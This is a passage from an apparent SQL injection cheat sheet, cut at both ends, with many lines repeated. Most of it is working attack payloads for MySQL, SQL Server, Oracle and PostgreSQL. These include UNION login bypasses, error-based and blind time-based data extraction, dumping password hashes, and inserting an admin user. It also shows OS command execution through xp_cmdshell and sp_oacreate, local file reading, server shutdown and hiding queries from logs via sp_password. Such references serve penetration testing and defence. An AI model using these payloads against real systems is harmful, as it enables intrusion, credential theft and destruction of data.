MySQL:\nCONCAT(str1, str2, str3, ...) (M) Concatenate supplied strings. SELECT CONCAT(login, password) FROM members\nSELECT CONCAT(login, password) FROM members\nApart from a few direct ways of specifying strings, you can always use CHAR() (MS) and CONCAT() (M) to generate a string without quotes.\n0x457578 (M): Return a string based on the hex representation SELECT 0x457578 This will be selected as a string in MySQL.\nHere’s an easy trick to generate hex representations of strings in MySQL: SELECT CONCAT('0x',HEX('c:\\\\boot.ini'))\nSELECT CONCAT('0x',HEX('c:\\\\boot.ini'))\nAll these examples return the string KLM :\nSELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M)\nSELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))\nSELECT CHAR(75)+CHAR(76)+CHAR(77) (S)\nSELECT CHAR(75)+CHAR(76)+CHAR(77)\nSELECT CHR(75)||CHR(76)||CHR(77) (O)\nSELECT CHR(75)||CHR(76)||CHR(77)\nSELECT (CHaR(75)||CHaR(76)||CHaR(77)) (P)\nSELECT (CHaR(75)||CHaR(76)||CHaR(77))\nSELECT LOAD_FILE(0x633A5C626F6F742E696E69) (M) This will show the content of c:\\boot.ini\nSELECT LOAD_FILE(0x633A5C626F6F742E696E69)\nASCII() (SMPO) Returns the ASCII character value of the leftmost character, which is especially useful for blind SQL injections. SELECT ASCII('a')\nCHAR() (SM) Returns a character based on its ASCII value. SELECT CHAR(64)\nCHR() (P) Returns a character based on its ASCII value. SELECT CHR(64)\nWith the UNION statement, you can run cross-table SQL queries. Basically, by injecting UNION , you can poison a query to return records from another table.\nSELECT header, txt FROM news UNION ALL SELECT name, pass FROM members This query will combine results from the news and members tables and return all of them.\nSELECT header, txt FROM news UNION ALL SELECT name, pass FROM members\nOne sample payload might be: ' UNION SELECT 1, 'anotheruser', 'any string', 1--\n' UNION SELECT 1, 'anotheruser', 'any string', 1--\nDealing with language issues in UNION injections\nWhile exploiting UNION injections, you can sometimes get errors because of different language settings (different locales in table settings, field settings, or combined table and database settings). It’s not a common problem, but you can run into it when dealing with applications that store data in different encodings. Here are a few tricks to deal with it:\nSQL Server (S) Use fieldname COLLATE SQL_Latin1_General_Cp1254_CS_AS (or another valid collation method, check the SQL Server documentation for details) Example: SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members\nSQL_Latin1_General_Cp1254_CS_AS\nSELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members\nMySQL (M) Use Hex() to deal with any encoding issues\nSQL injection 101—here are some typical login tricks that you can use with form fields and parameters:\nAnother trick is to log in as a different user (SM*): ' UNION SELECT 1, 'anotheruser', 'any string', 1--\n' UNION SELECT 1, 'anotheruser', 'any string', 1--\nBypassing login screens that use hashed passwords\nVery few applications still store passwords in plain text. If you want to bypass authentication by supplying your own password with a UNION query, you will need to hash the password before replacing it. Many hashing algorithms exist, but for simplicity, the examples below use the mostly obsolete MD5 algorithm.\nAn application may verify login credentials by first getting the user record based on the username and then checking if the hash of the input password value is correct. You can UNION results with a known password and the MD5 hash of this password. The application will then compare your password and your supplied MD5 hash instead of the hash value from the database.\nUsername: admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' Password: 1234\nadmin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'\n81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)\n81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)\nError-based ways to discover column information\nFinding column names using HAVING and GROUP BY (error-based) (S)\nTry the following payloads in the specified order:\n' HAVING 1=1 -- (triggers error 1)\n' GROUP BY table.columnfromerror1 HAVING 1=1 -- (triggers error 2)\n' GROUP BY table.columnfromerror1 HAVING 1=1 --\n' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- (triggers error 3)\n' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --\n' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --\n' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --\nOnce you are not getting any more errors, you are done.\nFinding the number of columns in a SELECT query using ORDER BY (MSO+)\nFinding the number of columns using ORDER BY can speed up the UNION SQL injection process. Try the following payloads:\nKeep going until you get an error, which means you have found the number of columns being selected.\nTips and tricks for error-based UNION injections\nAlways use UNION with ALL because you can have similar non-distinct field types. By default, UNION tries to get distinct records.\nTo get rid of unwanted records from the left-side table in a join, you can use -1 or any non-existent record search at the beginning of your query (only when injecting into the WHERE clause). This can be necessary if you are only getting one result at a time.\nFor most data types, you can use NULL in UNION injections instead of trying to guess if the column is a string, date, integer etc.\nIn blind injection situations, make sure you always check if the error is coming from the database or from the application itself. Some languages (like ASP.NET) tend to generally throw errors when dealing with NULL values (mostly because developers are not expecting to process NULL in a field like username.)\nWays of finding the column type\nUse the sum() function to provoke errors from non-numeric types:\n' UNION SELECT sum( columntofind ) from users -- (S) Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.\n' UNION SELECT sum( columntofind ) from users --\nMicrosoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.\nIf you are not getting an error, it means the column is numeric.\nYou can also use cast() or convert() in a similar way, for example:\nSELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--\nSELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--\n11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –- No error—the syntax is correct and MS SQL Server is used. Proceeding.\n11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-\n11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –- No error—we now know the first column is an integer.\n11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-\n11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- Microsoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed. Error! The second column is not an integer.\n11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --\nMicrosoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed.\nMicrosoft OLE DB Provider for SQL Server error '80040e07' Explicit conversion from data type int to image is not allowed.\n11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- No error—the second column is a string.\n11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –-\n11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- Error! The third column is not an integer…\n11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –-\nRinse and repeat until you have all the column types mapped out.\nYou will get convert() errors before UNION target errors, so remember to start with convert() and only then do UNION .\nWhile SELECT statements are normally preferred for testing as non-destructive, an INSERT injection into a user table can allow you to add a new user, hopefully with elevated permissions:\n'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* (MSO+)\n'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*\n@@version (MS) Gives you the database version and other information for SQL Server. This is a constant, so you can just select it like any other column (you don’t need to supply the table name). You can also use @@version in INSERT and UPDATE statements as well as in functions: INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)\nINSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)\nversion() (P) UNION SELECT NULL, version(), NULL\nUNION SELECT NULL, version(), NULL\nsqlite_version() (L) UNION SELECT NULL,sqlite_version(),NULL;\nUNION SELECT NULL,sqlite_version(),NULL;\nPRODUCT_COMPONENT_VERSION table (O) SELECT version FROM PRODUCT_COMPONENT_VERSION WHERE product LIKE 'Oracle Database%';\nSELECT version FROM PRODUCT_COMPONENT_VERSION WHERE product LIKE 'Oracle Database%';\nInserting the content of a file into a table lets you browse local files when you only have database access. If you are dealing with a particularly old version of IIS (up to and including IIS6), if you don’t know the internal path of a web application, you can read the IIS metabase file at %systemroot%\\system32\\inetsrv\\MetaBase.xml , load it into a table, and then search in it to identify the application path.\nTo browse the content of a file, you can use:\nCREATE TABLE foo( line varchar(8000) ) BULK INSERT foo FROM 'c:\\inetpub\\wwwroot\\login.asp'\nCREATE TABLE foo( line varchar(8000) ) BULK INSERT foo FROM 'c:\\inetpub\\wwwroot\\login.asp'\nYou can then drop the temp table and repeat for another file.\nThe bcp (Bulk Copy Program) utility (S)\nUsing bcp, you can load files into a table or write table data to a file. Login credentials are required to use this utility.\nbcp \"SELECT * FROM test..foo\" queryout c:\\inetpub\\wwwroot\\runcommand.asp -c -Slocalhost -Usa -Pfoobar\nbcp \"SELECT * FROM test..foo\" queryout c:\\inetpub\\wwwroot\\runcommand.asp -c -Slocalhost -Usa -Pfoobar\nUsing VBS and WSH scripting (S)\nActiveX support in SQL Server lets you use Visual Basic Script (VBS) and Windows Script Host (WSH) scripting. Take this sample shell script:\ndeclare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe'\ndeclare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe'\nTo inject this into a username field, use a payload like:\n'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --\n'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --\nExecuting system commands using xp_cmdshell (S)\nThis is a well-known trick for command injection, but it has two crucial requirements:\nIt’s disabled by default in SQL Server 2005, so you need to enable it first (see below).\nYou need to have admin access to enable it.\nTypical payload to get the command prompt:\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'\nA simple ping check can be useful to see if you’re in (you’ll first need to set up a firewall or sniffer to identify the request):\nEXEC master.dbo.xp_cmdshell 'ping example.com'\nEXEC master.dbo.xp_cmdshell 'ping example.com'\nNote that you can’t directly read the results of this EXEC from an error, UNION query, or similar.\nEnabling xp_cmdshell in SQL Server 2005 (S)\nBy default, xp_cmdshell and several other potentially dangerous stored procedures are disabled in SQL Server 2005. Once you have admin access, you can enable these procedures as follows:\nEXEC sp_configure 'show advanced options',1 RECONFIGURE\nEXEC sp_configure 'show advanced options',1 RECONFIGURE\nEXEC sp_configure 'xp_cmdshell',1 RECONFIGURE\nEXEC sp_configure 'xp_cmdshell',1 RECONFIGURE\nPerforming registry operations in SQL Server (S)\nStored procedures are available to perform various registry operations. Some of these are undocumented and may change over time:\nSample payloads to read values from a registry path:\nexec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters', 'nullsessionshares' exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\snmp\\parameters\\validcommunities'\nexec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters', 'nullsessionshares' exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\snmp\\parameters\\validcommunities'\nOther useful stored procedures for SQL Server (S)\nManaging services: xp_servicecontrol\nListing storage media: xp_availablemedia\nListing ODBC resources: xp_enumdsn\nManaging the login mode: xp_loginconfig\nListing domains: xp_ntsec_enumdomains\nProcess termination (you need to know the PID): xp_terminate_process\nWriting an HTML file to a UNC or internal path: sp_makewebtask\nYou can also use sp_addextendedproc to add a new procedure, which basically lets you execute arbitrary code:\nsp_addextendedproc 'xp_webserver', 'c:\\temp\\x.dll' exec xp_webserver\nsp_addextendedproc 'xp_webserver', 'c:\\temp\\x.dll' exec xp_webserver\nUseful system views in SQL Server (S)\nError messages: master..sysmessages\nLinked servers: master..sysservers\nLogins and passwords (note that SQL Server 2000 and 2005 both use a similar and crackable algorithm for hashing passwords) SQL Server 2000: masters..sysxlogins SQL Server 2005: sys.sql_logins\nSQL Server 2000: masters..sysxlogins\nSQL Server 2005: sys.sql_logins\nHandy techniques for further MSSQL exploitation\nGet detailed information about the currently running process: SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/\nSELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/\nCheck if a command was successful by triggering an error condition depending on the return code: DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0\nDECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0\nGet the host name of the SQL server: HOST_NAME()\nCheck if a user is member of a specific group: IS_MEMBER (Transact-SQL)\nChecks if a user has a specific role: IS_SRVROLEMEMBER (Transact-SQL)\nOpen remote connections to another server: OPENDATASOURCE (Transact-SQL) OPENROWSET (Transact-SQL)\nRemember that you cannot use sub-selects in SQL Server INSERT queries.\nSQL injection into LIMIT (M) or ORDER (MSO)\nSELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;\nSELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;\nIf injecting into the second limit value, you can comment it out or use it in your UNION injection.\nThis can occasionally be useful. To shut down the database server, inject: ';shutdown --\nFinding and manipulating the database structure in SQL Server (S)\nGetting user-defined tables (S)\nUse the sysobjects system table (older versions) or sys.objects view (newer versions):\nSELECT name FROM sysobjects WHERE xtype = 'U' SELECT TOP 1 name FROM sys.objects WHERE type = 'U'\nSELECT name FROM sysobjects WHERE xtype = 'U' SELECT TOP 1 name FROM sys.objects WHERE type = 'U'\nUse the syscolumns and sysobjects system tables (older versions) or sys.columns and sys.objects views (newer versions):\nSELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')\nSELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')\nA very effective technique is to modify WHERE and use the NOT IN or NOT EXIST clause:\n... WHERE users NOT IN ('First User', 'Second User') SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)\n... WHERE users NOT IN ('First User', 'Second User') SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)\nOr you can resort to some dirty tricks for column enumeration:\nSELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT ( SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int as p where p.x=3) as int\nSELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT ( SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int as p where p.x=3) as int\nSelect p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21\nSelect p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21\nError-based SQL injections in SQL Server: A fast way to extract data (S)\nHere’s a sample payload that combines variables and system table queries to extract data into a temporary table (use syscolumns and sysobjects for older version and sys.columns and sys.objects for newer versions):\n';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;-- ';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM sys.columns WHERE id =(SELECT id FROM sys.objects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--\n';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;-- ';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM sys.columns WHERE id =(SELECT id FROM sys.objects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--\nFinding the database structure in MySQL (M)\nGetting user-defined tables (M)\nSELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'\nSELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'\nSELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'\nSELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'\nFinding the database structure in Oracle (O)\nGetting user-defined tables (O)\nSELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'\nSELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'\nSELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'\nSELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'\nIn any decent production application, you generally cannot see any error responses on the page. This rules out extracting data directly through error-based attacks. In these cases, you have to use blind SQL injections to extract the data. There are two basic kinds of blind SQL injections:\nNormal blind injections: You cannot see the response directly on the page, but you can still determine the result of a query based on a response or HTTP status code.\nTotally blind injections: You cannot see the effects of your injection in any kind of output. This is less common, for example when you’re injecting into a logging function or similar.\nIn normal blind injections, you can use IF statements or abuse WHERE clauses in queries, which is generally the easier route. For totally blind injections, you need to use some kind of wait function and then analyze the response times.\nExamples of available wait/timeout functions include:\nWAITFOR DELAY '0:0:10' in SQL Server\nBENCHMARK() and sleep(10) in MySQL\nFor Oracle, there are some PL/SQL tricks you can use for the same effect.\nReal-life example of an automatable blind SQL injection attack\nThis output is taken from a real private blind SQL injection tool while exploiting SQL Server back-ended application and enumerating table names. These requests are done for first character of the first table name. The SQL queries are a bit more complex then necessary to allow for automation. Through this series of injections, we are trying to determine the ASCII value of a character using a binary search algorithm. In effect, we’re asking a series of yes/no questions about value ranges.\nThe following series of queries was executed to track down the first character (where TRUE and FALSE flags indicate the logical result of each query):\nTRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)\nTRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)\nSince the last two queries both failed, we now know that 80 is the ASCII value of the first character of the table name, so the table name starts with the letter P. In this way, you can exploit blind SQL injections using a binary search algorithm. Another well-known way is to read data one bit at a time. Both methods can be effective in different conditions. If you can get direct feedback, it’s enough to go through a fixed list of possible characters. If your only indication of success are differing response times or if the application is slow, you can use an algorithm like the one above.\nWays of making databases wait or sleep for blind SQL injection attacks\nYou should only use time-based payloads for totally blind injections. For normal blind injections, it’s better to just use boolean-based methods (like error-based true/false tests) to identify the difference in responses.\nBe careful if using times longer than 20–30 seconds because the database API connection or script can time out.\nThis is just like a sleep command—a CPU-safe way to make the database wait for a specified time.\nYou can also use fractional time values, though in general, longer waiting times are less sensitive to variations in server load or available bandwidth:\nChecking if we’re the system administrator: if (select user) = 'sa' waitfor delay '0:0:10'\nif (select user) = 'sa' waitfor delay '0:0:10'\nDifferent ways of injecting a delay into something like WHERE ProductID = '1' . Instead of just the expected integer, we can try injecting: 1;waitfor delay '0:0:10'-- 1);waitfor delay '0:0:10'-- 1';waitfor delay '0:0:10'-- 1');waitfor delay '0:0:10'-- 1));waitfor delay '0:0:10'-- 1'));waitfor delay '0:0:10'--\nThe BENCHMARK() function is intended for timing performance when executing some expression a specified number of times. We can abuse it for time-based attacks to make MySQL wait a bit. Because this function consumes CPU cycles, be careful you don’t use up the entire web server resource limit. It’s best to start with lower values and increase them gradually just until you get stable results.\nBENCHMARK( how-many-repeats , expression-to-execute )\nBENCHMARK( how-many-repeats , expression-to-execute )\nAre we root? Woot! Let’s celebrate with a billion hashes: IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))\nIF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))\nChecking if a table exists: IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))\nIF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))\nSleep for the specified time in seconds:\nSELECT pg_sleep(10); Sleep for 10 seconds.\nSleep for the specified time in seconds:\nSELECT sleep(10); Sleep 10 seconds.\nSleep for the specified time in seconds:\n(SELECT CASE WHEN (NVL(ASCII(SUBSTR(( your-injected-query-here ),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual) If the condition is true, the response will arrive after 10 seconds. If it is false, the delay will be only one second.\n(SELECT CASE WHEN (NVL(ASCII(SUBSTR(( your-injected-query-here ),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)\nHow SQL injection attacks can be hidden from logs\nSQL Server log bypass using sp_password (S)\nFor security reasons, SQL Server doesn’t log queries that include the function sp_password (used for changing passwords). This can be abused to prevent certain queries from being logged by the database server—simply appending --sp_password to an SQL query is enough to bypass logging. Note that the request will still appear in web server logs if injecting into a GET parameter (but not POST ).\nTests to check if SQL injection is possible\nHere are some quick checks to determine if blind SQL injections are possible:\nTrying to inject into product.asp?id=4 (SMO): product.asp?id=5-1 (returns the result for id=4 ) product.asp?id=4 OR 1=1\nproduct.asp?id=5-1 (returns the result for id=4 )\nTrying to inject into product.asp?name=Book : product.asp?name=Bo'%2b'ok product.asp?name=Bo' || 'ok (only MO) product.asp?name=Book' OR 'x'='x\nproduct.asp?name=Bo' || 'ok (only MO)\nproduct.asp?name=Book' OR 'x'='x\nproduct.asp?name=Book' OR 'x'='x\nTips and tricks for working with MySQL\nWorking with users: SELECT User,Password FROM mysql.user; SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = 'root'; SELECT ... INTO DUMPFILE (Writes the query result into a new file—cannot modify existing files) SELECT USER(); SELECT password,USER() FROM mysql.user;\nSELECT User,Password FROM mysql.user;\nSELECT User,Password FROM mysql.user;\nSELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = 'root';\nSELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = 'root';\nSELECT ... INTO DUMPFILE (Writes the query result into a new file—cannot modify existing files)\nSELECT password,USER() FROM mysql.user;\nSELECT password,USER() FROM mysql.user;\nAbusing user-defined functions (UDF): create function LockWorkStation returns integer soname 'user32'; select LockWorkStation(); create function ExitProcess returns integer soname 'kernel32'; select exitprocess();\ncreate function LockWorkStation returns integer soname 'user32'; select LockWorkStation(); create function ExitProcess returns integer soname 'kernel32'; select exitprocess();\ncreate function LockWorkStation returns integer soname 'user32'; select LockWorkStation(); create function ExitProcess returns integer soname 'kernel32'; select exitprocess();\nGetting the first byte of the admin password hash: SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;\nSELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;\nSELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;\nReading a file: query.php?user=1+union+select+load_file(0x63...),1\nquery.php?user=1+union+select+load_file(0x63...),1\nquery.php?user=1+union+select+load_file(0x63...),1\nPopulating a table from a file using LOAD DATA INFILE (not available in a default config, you first need to enable the setting local_infile ): CREATE TABLE foo( line blob ); LOAD DATA INFILE 'c:/boot.ini' INTO TABLE foo; SELECT * FROM foo;\nCREATE TABLE foo( line blob ); LOAD DATA INFILE 'c:/boot.ini' INTO TABLE foo; SELECT * FROM foo;\nCREATE TABLE foo( line blob ); LOAD DATA INFILE 'c:/boot.ini' INTO TABLE foo; SELECT * FROM foo;\nMore timing-based tricks for MySQL: select benchmark( 500000, sha1( 'test' ) ); query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1 select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' ); Brute-force enumeration: select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );\nselect benchmark( 500000, sha1( 'test' ) );\nselect benchmark( 500000, sha1( 'test' ) );\nquery.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1\nquery.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1\nselect if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );\nselect if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );\nBrute-force enumeration: select if( (ascii(substring(user(),1,1)) >> 